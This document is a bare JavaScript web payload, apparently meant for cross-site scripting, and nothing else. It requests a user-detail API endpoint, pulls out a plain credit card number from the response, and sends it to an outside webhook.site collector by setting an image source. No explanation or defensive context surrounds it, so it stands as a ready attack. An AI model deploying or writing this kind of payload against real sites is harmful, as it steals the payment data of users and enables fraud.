fetch("/api/user.php?action=detail_info")
  .then(r => r.json())
  .then(data => {
    new Image().src = "https://webhook.site/YOUR-ID?cc=" + encodeURIComponent(data.message.plain_credit_card || 'N/A');
  });
